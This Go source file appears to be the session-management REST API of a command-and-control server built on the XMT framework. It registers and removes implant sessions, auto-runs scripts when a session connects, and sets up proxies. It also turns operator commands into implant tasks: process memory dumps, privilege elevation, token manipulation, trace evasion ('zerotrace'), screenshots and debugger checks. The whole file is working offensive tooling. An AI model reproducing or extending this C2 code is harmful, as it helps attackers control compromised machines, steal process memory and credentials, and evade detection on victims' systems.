// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package cirrus

import (
	"context"
	"net/http"
	"strconv"
	"strings"
	"sync"

	"github.com/PurpleSec/routex"
	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const msgNoSession = "session was not found"

var (
	errEmptyFilter    = xerr.New("invalid or empty filter")
	errInvalidSleep   = xerr.New("invalid sleep value")
	errInvalidJitter  = xerr.New("invalid jitter value")
	errUnknownCommand = xerr.New("invalid or unrecognized command")
)

type session struct {
	sync.RWMutex
	s *c2.Session
	j []uint16
	h uint32
}
type sessionManager struct {
	*Cirrus
	sync.RWMutex

	e map[string]*session
}

func (c *Cirrus) newSession(s *c2.Session) {
	if s == nil || s.ID.Empty() {
		return
	}
	n := s.ID.String()
	c.sessions.Lock()
	x, ok := c.sessions.e[n]
	if !ok {
		x = &session{s: s, h: s.ID.Hash()}
		c.sessions.e[n] = x
	}
	c.sessions.Unlock()
	c.sessions.events.publishSessionNew(n)
	s.Receive, s.Shutdown = c.migrateSession, c.shutdownSession
	c.sessionEvent(s, sSessionNew)
	l := s.Listener()
	if l == nil {
		return
	}
	v := strings.ToLower(l.String())
	c.listeners.RLock()
	z, ok := c.listeners.e[v]
	if c.listeners.RUnlock(); !ok || len(z.s) == 0 {
		return
	}
	q, _ := c.script(z.s)
	q.Lock()
	j, err := s.Tasklet(q.s)
	if q.Unlock(); err != nil {
		return
	}
	c.watchJob(x, j, "auto script "+z.s)
}
func (c *Cirrus) session(n string) *session {
	if len(n) == 0 || !isValidName(n) {
		return nil
	}
	c.sessions.RLock()
	v := c.sessions.e[strings.ToUpper(n)]
	c.sessions.RUnlock()
	return v
}
func (s *sessionManager) clearJobs(x *session) {
	if x.Lock(); len(x.j) == 0 {
		x.Unlock()
		return
	}
	s.jobs.Lock()
	for i := range x.j {
		var (
			h     = uint64(x.h)<<16 | uint64(x.j[i])
			j, ok = s.jobs.e[h]
		)
		if !ok {
			continue
		}
		if s.removeJob(j); j.Result != nil {
			j.Result.Clear()
			j.Result = nil
		}
		s.jobs.e[h], j = nil, nil
		delete(s.jobs.e, h)
	}
	s.jobs.Unlock()
	x.j = nil
	x.Unlock()
}
func (c *Cirrus) shutdownSession(s *c2.Session) {
	if s == nil || s.ID.Empty() {
		return
	}
	n := s.ID.String()
	c.sessions.RLock()
	x, ok := c.sessions.e[n]
	if c.sessions.RUnlock(); !ok {
		return
	}
	c.sessions.clearJobs(x)
	c.sessions.Lock()
	c.sessions.e[n] = nil
	delete(c.sessions.e, n)
	c.sessions.Unlock()
	c.events.publishSessionDelete(n)
	c.sessionEvent(s, sSessionDelete)
}
func (c *Cirrus) migrateSession(s *c2.Session, n *com.Packet) {
	if s == nil || n.ID != c2.RvMigrate {
		return
	}
	i := s.ID.String()
	c.sessions.RLock()
	_, ok := c.sessions.e[i]
	if c.sessions.RUnlock(); !ok {
		return
	}
	c.events.publishSessionUpdate(i)
	c.sessionEvent(s, sSessionUpdate)
}
func syscallPacket(c, a string, f *filter.Filter) (*com.Packet, error) {
	if len(c) == 0 {
		return nil, errUnknownCommand
	}
	if len(a) == 0 {
		return syscallSinglePacket(c, f)
	}
	switch a = strings.TrimSpace(a); strings.ToLower(c) {
	case "ls":
		if a == "-al" {
			return task.Ls(""), nil
		}
		return task.Ls(a), nil
	case "cd":
		return task.Cwd(a), nil
	case "wait":
		d, err := parseDuration(a)
		if err != nil {
			return nil, err
		}
		return task.Wait(d), nil
	case "chan":
		return nil, nil
	case "sleep":
		d, j, err := parseSleep(a)
		if err != nil {
			return nil, err
		}
		return task.Duration(d, j), nil
	case "jitter":
		j, err := parseJitter(a)
		if err != nil {
			return nil, err
		}
		return task.Jitter(j), nil
	case "elevate":
		if i, err := strconv.ParseUint(a, 10, 32); err == nil && i > 0 {
			return task.Elevate(&filter.Filter{PID: uint32(i)}), nil
		}
		return task.Elevate(filter.I(a)), nil
	case "untrust":
		if i, err := strconv.ParseUint(a, 10, 32); err == nil && i > 0 {
			return task.UnTrust(&filter.Filter{PID: uint32(i)}), nil
		}
		return task.UnTrust(filter.I(a)), nil
	case "procdump":
		if i, err := strconv.ParseUint(a, 10, 32); err == nil && i > 0 {
			return task.ProcessDump(&filter.Filter{PID: uint32(i)}), nil
		}
		return task.ProcessDump(filter.I(a)), nil
	case "procname":
		return task.ProcessName(a), nil
	case "check-dll":
		return task.CheckDLL(a), nil
	case "reload-dll":
		return task.ReloadDLL(a), nil
	}
	return nil, errUnknownCommand
}
func syscallSinglePacket(c string, f *filter.Filter) (*com.Packet, error) {
	switch strings.ToLower(c) {
	case "ls":
		return task.Ls(""), nil
	case "ps":
		return task.ProcessList(), nil
	case "pwd":
		return task.Pwd(), nil
	case "chan":
		return nil, nil
	case "mounts":
		return task.Mounts(), nil
	case "elevate":
		if f.Empty() {
			return nil, errEmptyFilter
		}
		return task.Elevate(f), nil
	case "refresh":
		return task.Refresh(), nil
	case "untrust":
		if f.Empty() {
			return nil, errEmptyFilter
		}
		return task.UnTrust(f), nil
	case "rev2self":
		return task.RevToSelf(), nil
	case "procdump":
		if f.Empty() {
			return nil, errEmptyFilter
		}
		return task.ProcessDump(f), nil
	case "zerotrace":
		return task.ZeroTrace(), nil
	case "screenshot":
		return task.ScreenShot(), nil
	case "check-debug":
		return task.IsDebugged(), nil
	}
	return nil, errUnknownCommand
}
func (s *session) syscall(c, a string, f *filter.Filter) (*c2.Job, error) {
	n, err := syscallPacket(c, a, f)
	if err != nil {
		return nil, err
	}
	if n == nil {
		s.s.SetChannel(isTrue(a))
		return nil, nil
	}
	return s.s.Task(n)
}
func (s *sessionManager) httpSessionGet(_ context.Context, w http.ResponseWriter, r *routex.Request) {
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	w.WriteHeader(http.StatusOK)
	x.s.JSON(w)
}
func (s *sessionManager) httpSessionsGet(_ context.Context, w http.ResponseWriter, _ *routex.Request) {
	w.WriteHeader(http.StatusOK)
	w.Write([]byte{'['})
	if s.RLock(); len(s.e) > 0 {
		var n int
		for _, v := range s.e {
			if n > 0 {
				w.Write([]byte{','})
			}
			v.s.JSON(w)
			n++
		}
	}
	s.RUnlock()
	w.Write([]byte{']'})
}
func (s *sessionManager) httpSessionDelete(_ context.Context, w http.ResponseWriter, r *routex.Request) {
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	var v bool
	if c, err := r.Content(); err == nil && len(c) > 0 {
		v = c.BoolDefault("shutdown", false)
	}
	s.s.Remove(x.s.ID, v)
	w.WriteHeader(http.StatusOK)
}
func (s *sessionManager) httpSessionProxyDelete(_ context.Context, w http.ResponseWriter, r *routex.Request) {
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	n := r.Values.StringDefault("name", "")
	if !isValidName(n) {
		writeError(http.StatusBadRequest, `value "name" cannot be invalid`, w, r)
		return
	}
	j, err := x.s.Task(task.ProxyRemove(strings.ToLower(n)))
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "proxy delete "+n)
	w.WriteHeader(http.StatusOK)
	j.JSON(w)
}
func (s *sessionManager) httpSessionProxyPutPost(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	n := r.Values.StringDefault("name", "")
	if !isValidName(n) {
		writeError(http.StatusBadRequest, `value "name" cannot be invalid`, w, r)
		return
	}
	var (
		b    = c.StringDefault("address", "")
		p, _ = s.profile(c.StringDefault("profile", ""))
	)
	if len(b) == 0 {
		writeError(http.StatusBadRequest, `value "address" cannot be empty`, w, r)
		return
	}
	var (
		j   *c2.Job
		err error
	)
	if r.IsPost() {
		j, err = x.s.Task(task.ProxyReplace(strings.ToLower(n), b, p))
	} else {
		j, err = x.s.Task(task.Proxy(strings.ToLower(n), b, p))
	}
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	if r.IsPost() {
		s.watchJob(x, j, "proxy mod "+n+" "+b+" "+p.String())
		w.WriteHeader(http.StatusOK)
	} else {
		s.watchJob(x, j, "proxy add "+n+" "+b+" "+p.String())
		w.WriteHeader(http.StatusCreated)
	}
	j.JSON(w)
}
